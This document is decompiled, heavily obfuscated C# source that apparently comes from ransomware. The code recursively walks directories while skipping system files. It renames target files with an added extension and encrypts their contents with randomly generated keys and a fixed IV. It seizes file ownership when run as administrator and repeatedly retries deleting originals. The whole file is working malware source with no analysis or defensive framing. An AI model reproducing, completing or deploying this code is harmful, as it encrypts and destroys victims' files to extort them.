using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using kpignTVqPwcPC;

namespace GlIxuPPoosXGy;

internal sealed class kdXBbWqHjtnYq
{
	public sealed class rTWQkwAFUITjPi
	{
		private static StringCollection oggADDgCpwoH;

		private static List<string> HiCEbscQxwlbd;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107407801));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107393322)) && !text.ToLower().Contains(getString_0(107407796)) && !text.ToLower().Contains(getString_0(107393288)) && !text.ToLower().Contains(getString_0(107393243)) && !text.ToLower().Contains(getString_0(107407815)) && !text.ToLower().Contains(getString_0(107393197)) && !text.ToLower().Contains(getString_0(107393561)) && !text.ToLower().Contains(getString_0(107393576)) && !text.ToLower().Contains(getString_0(107393527)) && !text.ToLower().Contains(getString_0(107393542)) && !text.ToLower().Contains(getString_0(107393508)) && !text.ToLower().Contains(getString_0(107393459)) && !text.ToLower().Contains(getString_0(107393474)) && !text.ToLower().Contains(getString_0(107393429)) && !text.ToLower().Contains(getString_0(107393440)) && !text.ToLower().Contains(getString_0(107393395)) && !text.ToLower().Contains(getString_0(107393414)) && !text.ToLower().Contains(getString_0(107392853)) && !text.ToLower().Contains(getString_0(107392868)) && !text.Contains(hNmpLWayyKYy(getString_0(107392819))) && !text.Contains(getString_0(107392794)) && !text.Contains(getString_0(107392781)) && !text.EndsWith(getString_0(107395984)) && !text.EndsWith(getString_0(107392756)) && !text.EndsWith(getString_0(107392751)) && !text.EndsWith(getString_0(107392778)) && !text.EndsWith(getString_0(107392773)) && !text.ToLower().Contains(getString_0(107392768)) && !text.ToLower().Contains(tHmQYSpikTiuXUcp))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(nnhqbergWhMClf) * 1024.0 * 1024.0 && xUGtSzShmupOk == getString_0(107396967))
							{
								HiCEbscQxwlbd.Add(text);
							}
							else if (File.Exists(text) && xUGtSzShmupOk == getString_0(107396424))
							{
								HiCEbscQxwlbd.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return HiCEbscQxwlbd;
		}

		static rTWQkwAFUITjPi()
		{
			Strings.CreateGetStringDelegate(typeof(rTWQkwAFUITjPi));
			oggADDgCpwoH = new StringCollection();
			HiCEbscQxwlbd = new List<string>();
		}
	}

	private sealed class PblFtmDLYqge
	{
		public string JbAiLkhAACkimV;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == JbAiLkhAACkimV;
		}
	}

	private sealed class ZfhkFAGYSoSgG
	{
		private sealed class uGHizjENRddCfr
		{
			public ZfhkFAGYSoSgG mUgenAdltUHHhw;

			public string SMGORJpOwHGvru;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					bUXhgPibIRSr(WindowsIdentity.GetCurrent().Name, SMGORJpOwHGvru);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				SxsmLPyGxple(SMGORJpOwHGvru, mUgenAdltUHHhw.NRLfKStyarqBcj, mUgenAdltUHHhw.rUaFCnBVYOEj, mUgenAdltUHHhw.oiQrubJaQK, mUgenAdltUHHhw.gZBWhvjRsG);
			}
		}

		public string[] NRLfKStyarqBcj;

		public string[] oiQrubJaQK;

		public string gZBWhvjRsG;

		public string rUaFCnBVYOEj;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			uGHizjENRddCfr CS_0024_003C_003E8__locals0 = new uGHizjENRddCfr();
			CS_0024_003C_003E8__locals0.mUgenAdltUHHhw = this;
			CS_0024_003C_003E8__locals0.SMGORJpOwHGvru = string_0;
			if (IqUPhqLWEelTFf && !qalydKPwEW().Contains(getString_0(107390440)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						bUXhgPibIRSr(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.SMGORJpOwHGvru);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (htNfweWWpfJ == getString_0(107396973))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					SxsmLPyGxple(CS_0024_003C_003E8__locals0.SMGORJpOwHGvru, CS_0024_003C_003E8__locals0.mUgenAdltUHHhw.NRLfKStyarqBcj, CS_0024_003C_003E8__locals0.mUgenAdltUHHhw.rUaFCnBVYOEj, CS_0024_003C_003E8__locals0.mUgenAdltUHHhw.oiQrubJaQK, CS_0024_003C_003E8__locals0.mUgenAdltUHHhw.gZBWhvjRsG);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				SxsmLPyGxple(CS_0024_003C_003E8__locals0.SMGORJpOwHGvru, NRLfKStyarqBcj, rUaFCnBVYOEj, oiQrubJaQK, gZBWhvjRsG);
			}
		}

		static ZfhkFAGYSoSgG()
		{
			Strings.CreateGetStringDelegate(typeof(ZfhkFAGYSoSgG));
		}
	}

	private sealed class hsgCGlZmFqZgdS
	{
		private sealed class YibPRBMfpiof
		{
			public hsgCGlZmFqZgdS TpAgeLiVgB;

			public string svwZpKIpClQ;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in mvTZfeUAoYGCG)
				{
					if (svwZpKIpClQ.ToLower().EndsWith(item + TpAgeLiVgB.IWdEctQcjcfU) && RvOsVhMhBnkE == getString_0(107396984))
					{
						if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > new FileInfo(svwZpKIpClQ).Length)
						{
							try
							{
								TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394168), getString_0(107394163), getString_0(107394118), svwZpKIpClQ);
							}
							catch
							{
							}
						}
					}
					else if (svwZpKIpClQ.ToLower().EndsWith(item) && RvOsVhMhBnkE == getString_0(107396441))
					{
						try
						{
							TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394168), getString_0(107394163), getString_0(107394118), svwZpKIpClQ);
						}
						catch
						{
						}
					}
				}
			}

			static YibPRBMfpiof()
			{
				Strings.CreateGetStringDelegate(typeof(YibPRBMfpiof));
			}
		}

		private sealed class iWNmFMCphk
		{
			public hsgCGlZmFqZgdS TpAgeLiVgB;

			public string itKWIypHRJi;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in mvTZfeUAoYGCG)
				{
					if (itKWIypHRJi.ToLower().EndsWith(item + TpAgeLiVgB.IWdEctQcjcfU) && RvOsVhMhBnkE == getString_0(107396987))
					{
						if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > new FileInfo(itKWIypHRJi).Length)
						{
							try
							{
								TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394171), getString_0(107394166), getString_0(107394121), itKWIypHRJi);
							}
							catch
							{
							}
						}
					}
					else if (itKWIypHRJi.ToLower().EndsWith(item) && RvOsVhMhBnkE == getString_0(107396444))
					{
						try
						{
							TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394171), getString_0(107394166), getString_0(107394121), itKWIypHRJi);
						}
						catch
						{
						}
					}
				}
			}

			static iWNmFMCphk()
			{
				Strings.CreateGetStringDelegate(typeof(iWNmFMCphk));
			}
		}

		public List<string> hIEBOeIGEZvf;

		public List<string> AKWToBmSQCY;

		public string IWdEctQcjcfU;

		public string[] iCksgxyMsFHT;

		public string cGVxFqKPccB;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			YibPRBMfpiof CS_0024_003C_003E8__locals0;
			foreach (string item in AKWToBmSQCY)
			{
				if (iCksgxyMsFHT.Length != 0)
				{
					string[] array = iCksgxyMsFHT;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_06c5;
					}
				}
				try
				{
					if (item.EndsWith(IWdEctQcjcfU))
					{
						goto IL_06c5;
					}
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				if (!item.EndsWith(string_0) || yjAazhPgxhDIu.Contains(item))
				{
					continue;
				}
				if (MQUfpBGDuCn == getString_0(107396981))
				{
					try
					{
						if (FoJEBmAKQRl.kzWoqBsyxTSV(item))
						{
							FoJEBmAKQRl.iGdfIpreqzioppCmo(item);
						}
					}
					catch
					{
					}
				}
				yjAazhPgxhDIu.Add(item);
				if (!hxATskUeUhTwX.Contains(Path.GetDirectoryName(item)))
				{
					hxATskUeUhTwX.Add(Path.GetDirectoryName(item));
				}
				vMQXbyqMVqGcq(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (keaHDdagjiDMCTfH)
						{
							try
							{
								File.AppendAllText(RztYwSIsnQJzs, getString_0(107390582) + item + getString_0(107407780) + ex2.Message + getString_0(107396290));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00ef;
					}
					if (YNNeNxsxnCwT == getString_0(107396981) && new FileInfo(item).Length > Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024 && !hIEBOeIGEZvf.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new YibPRBMfpiof();
						CS_0024_003C_003E8__locals0.TpAgeLiVgB = this;
						try
						{
							if (IWdEctQcjcfU != getString_0(107389791))
							{
								File.Move(item, item + IWdEctQcjcfU);
							}
						}
						catch (Exception ex4)
						{
							if (keaHDdagjiDMCTfH)
							{
								try
								{
									File.AppendAllText(RztYwSIsnQJzs, getString_0(107390582) + item + getString_0(107407207) + ex4.Message + getString_0(107396290));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.svwZpKIpClQ = getString_0(107394052);
						if (IWdEctQcjcfU != getString_0(107389791))
						{
							CS_0024_003C_003E8__locals0.svwZpKIpClQ = item + IWdEctQcjcfU;
						}
						else
						{
							CS_0024_003C_003E8__locals0.svwZpKIpClQ = item;
						}
						if (yXsKxXdmTMDNpi == getString_0(107396981))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in mvTZfeUAoYGCG)
								{
									if (CS_0024_003C_003E8__locals0.svwZpKIpClQ.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.TpAgeLiVgB.IWdEctQcjcfU) && RvOsVhMhBnkE == YibPRBMfpiof.getString_0(107396984))
									{
										if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.svwZpKIpClQ).Length)
										{
											try
											{
												TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(YibPRBMfpiof.getString_0(107394168), YibPRBMfpiof.getString_0(107394163), YibPRBMfpiof.getString_0(107394118), CS_0024_003C_003E8__locals0.svwZpKIpClQ);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.svwZpKIpClQ.ToLower().EndsWith(item2) && RvOsVhMhBnkE == YibPRBMfpiof.getString_0(107396441))
									{
										try
										{
											TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(YibPRBMfpiof.getString_0(107394168), YibPRBMfpiof.getString_0(107394163), YibPRBMfpiof.getString_0(107394118), CS_0024_003C_003E8__locals0.svwZpKIpClQ);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = gJxaSuoOQaPVid.gnXBQuQIgzoruM(32);
						string s = NkovHMVDww.EAiaLHGuShXIai(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = MxUzGRRcXX.QuWsNWvThdQ(CS_0024_003C_003E8__locals0.svwZpKIpClQ, Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024);
						MxUzGRRcXX.odkHVYyoApHj(rFvIApGcuwP: (!ZzeIutOVdkVrn) ? (fYzeXSQMFrly ? MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_, Encoding.ASCII.GetBytes(cGVxFqKPccB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (fYzeXSQMFrly ? HfiFGrXOdAS.empuJnDsZdZVMo(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HfiFGrXOdAS.empuJnDsZdZVMo(byte_, Encoding.ASCII.GetBytes(cGVxFqKPccB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZjXIlWQLYaMG: CS_0024_003C_003E8__locals0.svwZpKIpClQ, jaymlfBImxINZRaE: bytes);
					}
					else
					{
						string text2 = gJxaSuoOQaPVid.gnXBQuQIgzoruM(32);
						string s2 = NkovHMVDww.EAiaLHGuShXIai(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (IWdEctQcjcfU != getString_0(107389791))
						{
							if (!RySdpyQRxMNXcP)
							{
								if (!fYzeXSQMFrly)
								{
									yyIfDArNcCubd(item, item + IWdEctQcjcfU, OasPkTxEhkqARxDV);
								}
								else
								{
									yyIfDArNcCubd(item, item + IWdEctQcjcfU, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!fYzeXSQMFrly)
									{
										aofPqeDxZqP(item, item + IWdEctQcjcfU, OasPkTxEhkqARxDV);
									}
									else
									{
										aofPqeDxZqP(item, item + IWdEctQcjcfU, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (keaHDdagjiDMCTfH)
									{
										try
										{
											File.AppendAllText(RztYwSIsnQJzs, getString_0(107390582) + item + getString_0(107389809) + ex6.Message + getString_0(107396290));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!RySdpyQRxMNXcP)
						{
							if (!fYzeXSQMFrly)
							{
								yyIfDArNcCubd(item, item + getString_0(107389786), OasPkTxEhkqARxDV);
							}
							else
							{
								yyIfDArNcCubd(item, item + getString_0(107389786), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!fYzeXSQMFrly)
								{
									aofPqeDxZqP(item, item, OasPkTxEhkqARxDV);
								}
								else
								{
									aofPqeDxZqP(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (keaHDdagjiDMCTfH)
								{
									try
									{
										File.AppendAllText(RztYwSIsnQJzs, getString_0(107390582) + item + getString_0(107389809) + ex8.Message + getString_0(107396290));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (fYzeXSQMFrly)
						{
							if (IWdEctQcjcfU != getString_0(107389791))
							{
								GoDAxkQbrqjFWYn(item + IWdEctQcjcfU, bytes2);
							}
							else
							{
								GoDAxkQbrqjFWYn(item, bytes2);
							}
						}
					}
					goto IL_06c5;
					end_IL_00ef:;
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				continue;
				IL_06c5:
				AKWToBmSQCY.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			iWNmFMCphk CS_0024_003C_003E8__locals0 = new iWNmFMCphk();
			CS_0024_003C_003E8__locals0.TpAgeLiVgB = this;
			CS_0024_003C_003E8__locals0.itKWIypHRJi = string_0;
			if (iCksgxyMsFHT.Length != 0)
			{
				string[] array = iCksgxyMsFHT;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.itKWIypHRJi.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.itKWIypHRJi.EndsWith(IWdEctQcjcfU))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!yjAazhPgxhDIu.Contains(CS_0024_003C_003E8__locals0.itKWIypHRJi))
			{
				if (MQUfpBGDuCn == getString_0(107396981))
				{
					try
					{
						if (FoJEBmAKQRl.kzWoqBsyxTSV(CS_0024_003C_003E8__locals0.itKWIypHRJi))
						{
							FoJEBmAKQRl.iGdfIpreqzioppCmo(CS_0024_003C_003E8__locals0.itKWIypHRJi);
						}
					}
					catch
					{
					}
				}
				yjAazhPgxhDIu.Add(CS_0024_003C_003E8__locals0.itKWIypHRJi);
				if (!hxATskUeUhTwX.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.itKWIypHRJi)))
				{
					hxATskUeUhTwX.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.itKWIypHRJi));
				}
				vMQXbyqMVqGcq(CS_0024_003C_003E8__locals0.itKWIypHRJi);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.itKWIypHRJi).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (keaHDdagjiDMCTfH)
						{
							try
							{
								File.AppendAllText(RztYwSIsnQJzs, getString_0(107390582) + CS_0024_003C_003E8__locals0.itKWIypHRJi + getString_0(107407780) + ex2.Message + getString_0(107396290));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (YNNeNxsxnCwT == getString_0(107396981) && new FileInfo(CS_0024_003C_003E8__locals0.itKWIypHRJi).Length > Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024)
					{
						try
						{
							if (IWdEctQcjcfU != getString_0(107389791))
							{
								File.Move(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + IWdEctQcjcfU);
							}
						}
						catch (Exception ex4)
						{
							if (keaHDdagjiDMCTfH)
							{
								try
								{
									File.AppendAllText(RztYwSIsnQJzs, getString_0(107390582) + CS_0024_003C_003E8__locals0.itKWIypHRJi + getString_0(107407207) + ex4.Message + getString_0(107396290));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (IWdEctQcjcfU != getString_0(107389791))
						{
							CS_0024_003C_003E8__locals0.itKWIypHRJi += IWdEctQcjcfU;
						}
						if (yXsKxXdmTMDNpi == getString_0(107396981))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in mvTZfeUAoYGCG)
								{
									if (CS_0024_003C_003E8__locals0.itKWIypHRJi.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.TpAgeLiVgB.IWdEctQcjcfU) && RvOsVhMhBnkE == iWNmFMCphk.getString_0(107396987))
									{
										if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.itKWIypHRJi).Length)
										{
											try
											{
												TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(iWNmFMCphk.getString_0(107394171), iWNmFMCphk.getString_0(107394166), iWNmFMCphk.getString_0(107394121), CS_0024_003C_003E8__locals0.itKWIypHRJi);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.itKWIypHRJi.ToLower().EndsWith(item) && RvOsVhMhBnkE == iWNmFMCphk.getString_0(107396444))
									{
										try
										{
											TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(iWNmFMCphk.getString_0(107394171), iWNmFMCphk.getString_0(107394166), iWNmFMCphk.getString_0(107394121), CS_0024_003C_003E8__locals0.itKWIypHRJi);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = gJxaSuoOQaPVid.gnXBQuQIgzoruM(32);
						string s = NkovHMVDww.EAiaLHGuShXIai(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = MxUzGRRcXX.QuWsNWvThdQ(CS_0024_003C_003E8__locals0.itKWIypHRJi, Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024);
						MxUzGRRcXX.odkHVYyoApHj(rFvIApGcuwP: (!ZzeIutOVdkVrn) ? (fYzeXSQMFrly ? MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_, Encoding.ASCII.GetBytes(cGVxFqKPccB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (fYzeXSQMFrly ? HfiFGrXOdAS.empuJnDsZdZVMo(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HfiFGrXOdAS.empuJnDsZdZVMo(byte_, Encoding.ASCII.GetBytes(cGVxFqKPccB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZjXIlWQLYaMG: CS_0024_003C_003E8__locals0.itKWIypHRJi, jaymlfBImxINZRaE: bytes);
					}
					else
					{
						string text2 = gJxaSuoOQaPVid.gnXBQuQIgzoruM(32);
						string s2 = NkovHMVDww.EAiaLHGuShXIai(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (IWdEctQcjcfU != getString_0(107389791))
						{
							if (!RySdpyQRxMNXcP)
							{
								if (!fYzeXSQMFrly)
								{
									yyIfDArNcCubd(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + IWdEctQcjcfU, OasPkTxEhkqARxDV);
								}
								else
								{
									yyIfDArNcCubd(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + IWdEctQcjcfU, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!fYzeXSQMFrly)
									{
										aofPqeDxZqP(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + IWdEctQcjcfU, OasPkTxEhkqARxDV);
									}
									else
									{
										aofPqeDxZqP(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + IWdEctQcjcfU, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (keaHDdagjiDMCTfH)
									{
										try
										{
											File.AppendAllText(RztYwSIsnQJzs, getString_0(107390582) + CS_0024_003C_003E8__locals0.itKWIypHRJi + getString_0(107389809) + ex6.Message + getString_0(107396290));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!RySdpyQRxMNXcP)
						{
							if (!fYzeXSQMFrly)
							{
								yyIfDArNcCubd(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + getString_0(107389786), OasPkTxEhkqARxDV);
							}
							else
							{
								yyIfDArNcCubd(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + getString_0(107389786), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!fYzeXSQMFrly)
								{
									aofPqeDxZqP(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi, OasPkTxEhkqARxDV);
								}
								else
								{
									aofPqeDxZqP(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (keaHDdagjiDMCTfH)
								{
									try
									{
										File.AppendAllText(RztYwSIsnQJzs, getString_0(107390582) + CS_0024_003C_003E8__locals0.itKWIypHRJi + getString_0(107389809) + ex8.Message + getString_0(107396290));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (fYzeXSQMFrly)
						{
							if (IWdEctQcjcfU != getString_0(107389791))
							{
								GoDAxkQbrqjFWYn(CS_0024_003C_003E8__locals0.itKWIypHRJi + IWdEctQcjcfU, bytes2);
							}
							else
							{
								GoDAxkQbrqjFWYn(CS_0024_003C_003E8__locals0.itKWIypHRJi, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			AKWToBmSQCY.Remove(CS_0024_003C_003E8__locals0.itKWIypHRJi);
		}

		static hsgCGlZmFqZgdS()
		{
			Strings.CreateGetStringDelegate(typeof(hsgCGlZmFqZgdS));
		}
	}

	private sealed class ZwrReIenxYWY
	{
		public string QDlTULXGiBGxg;

		public string GAyopPluabSls;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(QDlTULXGiBGxg);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(GAyopPluabSls))
					{
						File.Delete(GAyopPluabSls);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string HepjTqUkLVyB;

	public static byte[] OasPkTxEhkqARxDV;

	public static string xUGtSzShmupOk;

	public static string nnhqbergWhMClf;

	public static List<string> tkcHcCnvalC;

	public static List<string> eDSqKoZuBiFnVQ;

	public static string CocLCSEHmD;

	public static string cGVxFqKPccB;

	public static string vaOvGgHCInLEo;

	public static string tjbwkkqjGcTNHLS;

	public static int iZKhurDDLnidT;

	public static string MQUfpBGDuCn;

	public static string MfkjGXKhxyhehv;

	public static string OtVbJHwGpAtFQyT;

	public static string NCJlttEOSHQg;

	public static string uccGqOrrMM;

	public static string aKzHxVBtSkJm;

	public static string ISWgsPSKHYk;

	public static string MgOyEjlOtOFzUj;

	public static List<string> XJrcacgShCStzR;

	public static List<string> hxATskUeUhTwX;

	public static string oioNbwnCpXU;

	public static string FgAipgzSjMdCQgJ;

	public static string FARyVqtSMcbb;

	public static List<string> yjAazhPgxhDIu;

	public static string xOOdbsMOOZj;

	private static string eocHXBFcoPc;

	public static string htNfweWWpfJ;

	public static string XfAUBFEpobWyiU;

	public static List<string> oqctRyBSIQ;

	public static List<string> tlnCIdpwTu;

	public static List<string> YlTzmyhpiwknfhq;

	public static List<string> zDTTWfcIAya;

	public static string FYfkyKTYUeI;

	public static List<string> rUYXUMGWrLAx;

	public static List<string> tmofVFVJKbRY;

	public static string MHekRYDPgvS;

	public static string wZVDIOgHreaG;

	internal static DateTime FhoQZCuugw;

	internal static DateTime cnzOdaYThekPAqQfq;

	public static string YNNeNxsxnCwT;

	public static string lgEGKUPjGpcc;

	public static string GyjdlyjfcEOXI;

	public static string cwjlAEBUmmgPcl;

	public static string LCiAwIOBLz;

	public static string coThoGGpnEMcnzu;

	public static string NQyfkhkCAdHiBh;

	public static string yXsKxXdmTMDNpi;

	public static List<string> mvTZfeUAoYGCG;

	public static string RvOsVhMhBnkE;

	public static string WgsiGxlkcXCewl;

	public static string ybZhGjghWRSmuX;

	public static string tFfqxfbrSvYza;

	public static string HhsonkWVytgykO;

	public static string ZUmpRuBwYbxQ;

	public static string XPTfyTotwfMK;

	public static string SspnFJsgjqAZV;

	public static string duEZpbNpcdRtQI;

	public static string PTCzeCuJCjetR;

	public static string erBYpyXGMnZKG;

	public static string aGfNoRGUNNAt;

	public static string tzUVFfNhnxlV;

	public static string LJtiQtEQkud;

	public static string PsPqDiPSbSOjtH;

	public static string HxHzgMFnFmlsE;

	public static string aRXDsVqHOBZWe;

	public static string hPhOROQxOBfQFczsT;

	public static string JLxpvIZTQHDy;

	public static string tHmQYSpikTiuXUcp;

	public static string VhcrQXrEyRMEqG;

	public static string QxtdOuqfCx;

	public static string jUSGzoxzYrHnqV;

	public static string yxYUzXQcSUSLG;

	public static string JXvIvRJSYKu;

	public static string hjNsvgTUNea;

	public static string HqdVGSzubAQV;

	public static string MLtgQsSXdeZzpG;

	public static string kskmTAbTAdUwgF;

	public static string[] fgyftAvJczBLO;

	public static string dYQrpOPXkxY;

	public static bool ZzeIutOVdkVrn;

	public static string WfmJqIEPUhuk;

	public static bool fYzeXSQMFrly;

	public static bool boFOzmYvevA;

	public static bool jlfnbBYuNDzI;

	public static bool IhOmrQOWDLAAWCMJa;

	public static string RztYwSIsnQJzs;

	public static bool keaHDdagjiDMCTfH;

	public static bool VyJJdhwQUG;

	public static bool GvXCAEeKPgvgux;

	public static bool IqUPhqLWEelTFf;

	public static bool RySdpyQRxMNXcP;

	public static string SXVCtbaEWR;

	public static List<string> zfFucxqmGOlbbp;

	public static List<string> XugKJAihpC;

	public static List<string> FXXItJkGMyTzK;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

